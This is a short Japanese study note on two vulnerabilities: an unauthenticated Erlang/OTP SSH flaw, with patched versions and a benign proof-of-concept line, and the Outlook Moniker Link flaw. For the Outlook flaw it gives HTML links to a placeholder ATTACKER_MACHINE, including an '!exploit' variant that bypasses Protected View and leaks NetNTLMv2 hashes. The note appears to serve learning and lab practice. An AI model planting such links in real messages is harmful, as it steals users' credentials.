# CVE

## CVE-2025-32433

https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py

- Erlang/OTP SSH
- 修正：OTP-27.3.3, OTP-26.2.5.11, or OTP-25.3.2.20.
- 認証情報不要

上記 URL の PoC は無害なファイルを作るだけ。

```
file:write_file("/lab.txt", <<"pwned">>)
```

## CVE-2024-21413（Moniker Link）

https://tryhackme.com/room/monikerlink

https://github.com/CMNatic/CVE-2024-21413

- Outlook の脆弱性で、Windows netNTLMv2 hash を盗む。
- アプリケーションを指定するリンクをモニカーリンクという。
- ユーザーがリンクをクリックしたら、ローカル認証情報が指定した IP に送信される。

```sh
# 通常のモニカーリンクは保護ビューにブロックされる
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

# 「!」文字を入れて、保護ビューをバイパスするリンク
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```
